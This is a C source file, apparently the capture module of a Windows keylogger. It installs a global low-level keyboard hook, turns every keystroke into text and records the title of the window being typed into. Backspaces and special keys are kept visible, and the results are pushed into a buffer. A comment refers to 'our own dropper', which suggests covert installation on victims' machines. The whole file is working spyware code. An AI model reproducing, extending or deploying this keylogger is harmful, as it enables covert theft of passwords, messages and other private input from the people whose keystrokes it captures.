// WH_KEYBOARD_LL hook + character translation.
//
// The hook callback must return within microseconds (the OS silently unhooks
// slow callbacks), so it only translates, refreshes the foreground title when
// the window changes, and pushes an event. Everything slow happens elsewhere.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <stdio.h>
#include <string.h>

#include "buffer.h"
#include "capture.h"
#include "gen_strings.h" // CFG_DEBUG_CONSOLE
#include "util.h"

#if CFG_DEBUG_CONSOLE
#define DBG(...) fprintf(stderr, __VA_ARGS__)
#else
#define DBG(...) ((void)0)
#endif

static HHOOK g_hook;
static BYTE  g_state[256];    // keyboard state maintained from hook events
static bool  g_dead_pending;  // a dead key is waiting to combine

#define TITLE_CACHE 32
static char    *g_titles[TITLE_CACHE]; // interned UTF-8 titles
static uint32_t g_title_count;
static uint32_t g_cur_title;
static HWND     g_cur_hwnd;

static HKL foreground_layout(void)
{
    HWND hwnd = GetForegroundWindow();
    if (!hwnd)
        return GetKeyboardLayout(0);
    return GetKeyboardLayout(GetWindowThreadProcessId(hwnd, NULL));
}

static bool is_modifier(UINT vk)
{
    switch (vk) {
    case VK_LWIN: case VK_RWIN:
    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
    case VK_MENU: case VK_LMENU: case VK_RMENU:
    case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL:
        return true;
    }
    return false;
}

static uint32_t intern_title(const wchar_t *wtitle)
{
    char *utf8 = wide_to_utf8(wtitle);
    if (!utf8)
        return g_cur_title;

    for (uint32_t i = 0; i < g_title_count; i++) {
        if (strcmp(g_titles[i], utf8) == 0) {
            HeapFree(GetProcessHeap(), 0, utf8);
            return i;
        }
    }
    if (g_title_count < TITLE_CACHE) {
        g_titles[g_title_count] = utf8;
        return g_title_count++;
    }
    // Cache full: keep the existing title rather than invalidating old indices.
    HeapFree(GetProcessHeap(), 0, utf8);
    return g_cur_title;
}

static void refresh_title_if_changed(void)
{
    HWND hwnd = GetForegroundWindow();
    if (hwnd == g_cur_hwnd)
        return;
    g_cur_hwnd = hwnd;

    wchar_t wtitle[512];
    int n = GetWindowTextW(hwnd, wtitle, 512);
    if (n <= 0)
        wcscpy(wtitle, L"(unknown)");
    g_cur_title = intern_title(wtitle);
}

void kbd_refresh_foreground_title(void)
{
    g_cur_hwnd = NULL; // force re-read on the next hook event / call
    refresh_title_if_changed();
}

const char *kbd_title_at(uint32_t idx)
{
    if (idx < g_title_count && g_titles[idx])
        return g_titles[idx];
    return "(unknown)";
}

// Returns number of wchar_t written into out (NUL-terminated), 0 = nothing.
static int translate(const KBDLLHOOKSTRUCT *k, wchar_t out[8])
{
    HKL layout = foreground_layout();
    int n = ToUnicodeEx(k->vkCode, k->scanCode, g_state, out, 8, 0, layout);
    if (n < 0) { // dead key stored; the next keystroke will combine
        g_dead_pending = true;
        return 0;
    }
    if (n == 0 && g_dead_pending) {
        // Documented quirk: after a dead key + space, the first call returns 0.
        g_dead_pending = false;
        n = ToUnicodeEx(k->vkCode, k->scanCode, g_state, out, 8, 0, layout);
    } else {
        g_dead_pending = false;
    }
    return n;
}

static void update_state(UINT vk, bool key_down)
{
    if (key_down) {
        g_state[vk] |= 0x80;
        if (vk == VK_LSHIFT || vk == VK_RSHIFT)
            g_state[VK_SHIFT] |= 0x80;
        if (vk == VK_LCONTROL || vk == VK_RCONTROL)
            g_state[VK_CONTROL] |= 0x80;
        if (vk == VK_LMENU || vk == VK_RMENU)
            g_state[VK_MENU] |= 0x80;
        if (vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL)
            g_state[vk] ^= 0x01; // toggle state flips on press
    } else {
        g_state[vk] &= ~0x80;
        if (vk == VK_LSHIFT || vk == VK_RSHIFT)
            g_state[VK_SHIFT] &= ~0x80;
        if (vk == VK_LCONTROL || vk == VK_RCONTROL)
            g_state[VK_CONTROL] &= ~0x80;
        if (vk == VK_LMENU || vk == VK_RMENU)
            g_state[VK_MENU] &= ~0x80;
    }
}

static LRESULT CALLBACK ll_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)lParam;
        bool key_down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        bool key_up   = (wParam == WM_KEYUP || wParam == WM_SYSKEYUP);

        // Skip injected keystrokes (our own dropper when testing, RDP, etc.),
        // unless the build was made for automated testing (SendKeys/SendInput).
#if !CFG_CAPTURE_INJECTED
        if (!(k->flags & LLKHF_INJECTED) && (key_down || key_up)) {
#else
        if (key_down || key_up) {
#endif
            update_state(k->vkCode, key_down);

            if (key_down && !is_modifier(k->vkCode) &&
                !(g_state[VK_CONTROL] & 0x80) && !(g_state[VK_MENU] & 0x80)) {
                refresh_title_if_changed();

                KEvent ev;
                ev.epoch_ms = now_ms();
                ev.title_idx = g_cur_title;
                memset(ev.text, 0, sizeof(ev.text));

                wchar_t raw[8] = {0};
                int n = translate(k, raw);
                if (n > 0) {
                    size_t o = 0;
                    for (int i = 0; i < n && o < 7; i++) {
                        wchar_t c = raw[i];
                        if (c == L'\r' || c == L'\n')
                            ev.text[o++] = L'\n';
                        else if (c == 0x08) { // backspace, kept visible
                            ev.text[o++] = L'<';
                            ev.text[o++] = L'B';
                            ev.text[o++] = L'S';
                            ev.text[o++] = L'>';
                        } else if (c >= 0x20) {
                            ev.text[o++] = c;
                        }
                    }
                } else if (n == 0) {
                    // Unprintable key (arrows, F-keys, ...): keep it visible.
                    _snwprintf(ev.text, 8, L"[VK_%02X]", k->vkCode);
                }
                if (ev.text[0]) {
                    buf_push(&ev);
                    DBG("capture: vk=0x%02x text=%ls count=%zu\n",
                        k->vkCode, ev.text, buf_count());
                }
            } else if (key_down) {
                // Modifier-only or ctrl/alt-combined keystroke: no text event.
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

bool kbd_install(void)
{
    if (!g_hook) {
        g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, ll_proc,
                                  GetModuleHandleW(NULL), 0);
    }
    return g_hook != NULL;
}

void kbd_uninstall(void)
{
    if (g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }
}

bool kbd_hook_ok(void)
{
    return g_hook != NULL;
}
